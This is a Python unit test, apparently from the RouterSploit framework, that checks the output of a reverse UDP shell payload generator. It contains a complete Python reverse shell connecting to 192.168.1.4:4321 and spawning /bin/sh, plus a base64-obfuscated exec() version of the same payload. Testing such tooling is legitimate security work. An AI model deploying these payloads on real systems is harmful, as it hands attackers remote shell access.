from routersploit.modules.payloads.python.reverse_udp import Payload


# python reverse udp payload with lhost=192.168.1.4 lport=4321
reverse_udp = (
    "import os\n" +
    "import pty\n" +
    "import socket\n" +
    "s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n" +
    "s.connect(('192.168.1.4',4321))\n" +
    "os.dup2(s.fileno(), 0)\n" +
    "os.dup2(s.fileno(), 1)\n" +
    "os.dup2(s.fileno(), 2)\n" +
    "pty.spawn('/bin/sh');\n" +
    "s.close()\n"
)

# python reverse udp payload with lhost=192.168.1.4 lport=4321 encoded with python/base64
reverse_udp_encoded = (
    "exec('aW1wb3J0IG9zCmltcG9ydCBwdHkKaW1wb3J0IHNvY2tldApzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQpzLmNvbm5lY3QoKCcxOTIuMTY4LjEuNCcsNDMyMSkpCm9zLmR1cDIocy5maWxlbm8oKSwgMCkKb3MuZHVwMihzLmZpbGVubygpLCAxKQpvcy5kdXAyKHMuZmlsZW5vKCksIDIpCnB0eS5zcGF3bignL2Jpbi9zaCcpOwpzLmNsb3NlKCkK'.decode('base64'))"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.lhost = "192.168.1.4"
    payload.lport = 4321

    assert payload.generate() == reverse_udp
    assert payload.run() == reverse_udp_encoded
